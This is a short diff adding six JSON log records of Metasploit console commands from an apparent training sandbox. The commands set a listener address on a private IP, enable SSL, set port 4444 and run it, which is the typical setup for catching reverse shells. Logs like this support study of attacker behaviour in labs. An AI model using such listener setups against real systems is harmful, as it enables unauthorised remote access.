@@ -1,0 +1,6 @@
+{"sandbox_id": "341", "timestamp_str": "2020-05-14T10:56:04.319010+02:00", "cmd_type": "msf-command", "cmd": "set lhost 10.1.135.83"}
+{"sandbox_id": "341", "timestamp_str": "2020-05-14T10:56:17.195432+02:00", "cmd_type": "msf-command", "cmd": "set ssl true"}
+{"sandbox_id": "341", "timestamp_str": "2020-05-14T10:56:20.034097+02:00", "cmd_type": "msf-command", "cmd": "run"}
+{"sandbox_id": "341", "timestamp_str": "2020-05-14T10:56:51.667296+02:00", "cmd_type": "msf-command", "cmd": "set lport 4444"}
+{"sandbox_id": "341", "timestamp_str": "2020-05-14T10:56:54.162907+02:00", "cmd_type": "msf-command", "cmd": "run"}
+{"sandbox_id": "341", "timestamp_str": "2020-05-14T10:57:09.889989+02:00", "cmd_type": "msf-command", "cmd": "show options"}
